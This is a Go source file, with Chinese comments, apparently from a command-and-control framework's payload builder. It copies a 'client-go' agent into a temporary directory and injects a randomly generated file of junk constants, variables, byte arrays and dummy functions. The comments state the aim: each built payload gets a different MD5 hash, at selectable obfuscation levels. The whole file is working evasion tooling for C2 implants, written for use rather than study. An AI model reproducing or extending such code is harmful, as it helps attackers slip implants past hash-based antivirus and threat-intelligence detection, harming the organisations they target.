package main

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// ============ Go Agent 源码混淆（EXE 生成专用）============
// 思路: 不修改 client-go 原始源码，而是在临时目录生成一个 wrapper main.go
// 该 wrapper import 原始包并调用 Run()，同时注入随机垃圾代码使每次编译产物 MD5 不同
//
// 实际实现（更简单可靠）: 直接在 client-go 临时副本中追加一个 gen_obf.go 文件
// 该文件包含大量随机生成的常量/变量/无用函数，Go 编译器会编译它们进二进制
// 配合 -buildid= 和 -trimpath，每次产物都不同

func init() {
	rand.Seed(time.Now().UnixNano())
}

// randHexStr 生成指定长度的随机十六进制字符串
func randHexStr(length int) string {
	const hex = "0123456789abcdef"
	var sb strings.Builder
	for i := 0; i < length; i++ {
		sb.WriteByte(hex[rand.Intn(len(hex))])
	}
	return sb.String()
}

// randAsciiStr 生成指定长度的随机 ASCII 字符串（可打印字符 33-126）
func randAsciiStr(length int) string {
	var sb strings.Builder
	for i := 0; i < length; i++ {
		sb.WriteByte(byte(33 + rand.Intn(94)))
	}
	return sb.String()
}

// randInt 返回 [min, max) 区间随机整数
func randInt(min, max int) int {
	if max <= min {
		return min
	}
	return min + rand.Intn(max-min)
}

// genGoJunkFile 生成一个 Go 源文件，包含大量随机变量/常量/字符串/无用函数
// 这些代码会被编译器处理并嵌入二进制，使每次编译产物 MD5 不同
// obfLevel: low=少量, medium=中等, high=大量, extreme=极大量
func genGoJunkFile(pkgName string, obfLevel string) string {
	count := 30 // 默认 medium
	switch obfLevel {
	case "low":
		count = 10
	case "medium":
		count = 30
	case "high":
		count = 80
	case "extreme":
		count = 200
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("package %s\n\n", pkgName))
	sb.WriteString("// 自动生成的混淆代码（build-time obfuscation）\n")
	sb.WriteString("// 每次生成 Payload 时重新生成，确保编译产物 MD5 不同\n\n")

	// 防止编译器优化掉的 init 函数
	sb.WriteString("var _obf_data = make(map[string]string)\n")
	sb.WriteString("func init() {\n")
	for i := 0; i < count; i++ {
		key := randHexStr(randInt(8, 24))
		val := randAsciiStr(randInt(16, 64))
		sb.WriteString(fmt.Sprintf("\t_obf_data[%q] = %q\n", key, val))
	}
	// 用随机条件强制使用 _obf_data，防止编译器完全优化
	sb.WriteString("\t_ = len(_obf_data)\n")
	sb.WriteString("}\n\n")

	// 随机常量（编译期嵌入二进制）
	for i := 0; i < count; i++ {
		name := "ObfConst" + randHexStr(randInt(6, 12))
		val := randHexStr(randInt(32, 128))
		sb.WriteString(fmt.Sprintf("const %s = %q\n", name, val))
	}
	sb.WriteString("\n")

	// 随机字符串变量
	for i := 0; i < count; i++ {
		name := "obfVar" + randHexStr(randInt(6, 12))
		val := randAsciiStr(randInt(20, 80))
		sb.WriteString(fmt.Sprintf("var %s = %q\n", name, val))
	}
	sb.WriteString("\n")

	// 随机字节数组（会被编译进 .rodata 段）
	for i := 0; i < count/2; i++ {
		name := "obfBytes" + randHexStr(randInt(6, 12))
		length := randInt(16, 64)
		sb.WriteString(fmt.Sprintf("var %s = []byte{", name))
		for j := 0; j < length; j++ {
			if j > 0 {
				sb.WriteString(", ")
			}
			sb.WriteString(fmt.Sprintf("0x%02x", rand.Intn(256)))
		}
		sb.WriteString("}\n")
	}
	sb.WriteString("\n")

	// 无用函数（编译器会保留，增加二进制体积和特征差异）
	// 收集函数名以便末尾引用（必须引用已定义的函数名，否则编译报错 undefined）
	var funcNames []string
	for i := 0; i < count/3; i++ {
		name := "ObfFunc" + randHexStr(randInt(6, 12))
		funcNames = append(funcNames, name)
		sb.WriteString(fmt.Sprintf("func %s() string {\n", name))
		sb.WriteString(fmt.Sprintf("\ts := %q\n", randAsciiStr(randInt(10, 40))))
		// 随机字符串拼接操作（不会执行，但编译器需处理）
		for j := 0; j < randInt(1, 5); j++ {
			sb.WriteString(fmt.Sprintf("\ts = s + %q\n", randAsciiStr(randInt(5, 20))))
		}
		sb.WriteString("\treturn s\n")
		sb.WriteString("}\n\n")
	}

	// 防止未使用报错的引用（使用上面已定义的函数名）
	sb.WriteString("var _ = func() int {\n")
	for _, name := range funcNames {
		sb.WriteString(fmt.Sprintf("\t_ = %s()\n", name))
	}
	sb.WriteString("\treturn 0\n")
	sb.WriteString("}()\n")

	return sb.String()
}

// prepareObfuscatedAgentDir 复制 client-go 到临时目录并注入混淆代码
// 返回临时目录路径，调用方负责清理
func prepareObfuscatedAgentDir(obfLevel string) (string, error) {
	srcDir := filepath.Join(projectRoot, "client-go")
	if !fileExists(srcDir) {
		return "", fmt.Errorf("client-go 目录不存在: %s", srcDir)
	}

	// 临时目录
	tmpDir := filepath.Join(os.TempDir(), fmt.Sprintf("c2agent_%d", time.Now().UnixNano()))
	if err := os.MkdirAll(tmpDir, 0755); err != nil {
		return "", fmt.Errorf("创建临时目录失败: %w", err)
	}

	// 复制 client-go 所有 .go 文件、go.mod、go.sum
	entries, err := os.ReadDir(srcDir)
	if err != nil {
		os.RemoveAll(tmpDir)
		return "", fmt.Errorf("读取 client-go 失败: %w", err)
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		// 只复制必要文件
		if !strings.HasSuffix(name, ".go") && name != "go.mod" && name != "go.sum" {
			continue
		}
		srcPath := filepath.Join(srcDir, name)
		dstPath := filepath.Join(tmpDir, name)
		if err := copyFile(srcPath, dstPath); err != nil {
			os.RemoveAll(tmpDir)
			return "", fmt.Errorf("复制 %s 失败: %w", name, err)
		}
	}

	// 生成混淆文件 gen_obf.go
	// 读取 go.mod 获取包名（通常为 main）
	pkgName := "main"
	obfCode := genGoJunkFile(pkgName, obfLevel)
	obfPath := filepath.Join(tmpDir, "z_obf_generated.go")
	if err := os.WriteFile(obfPath, []byte(obfCode), 0644); err != nil {
		os.RemoveAll(tmpDir)
		return "", fmt.Errorf("写入混淆文件失败: %w", err)
	}

	return tmpDir, nil
}
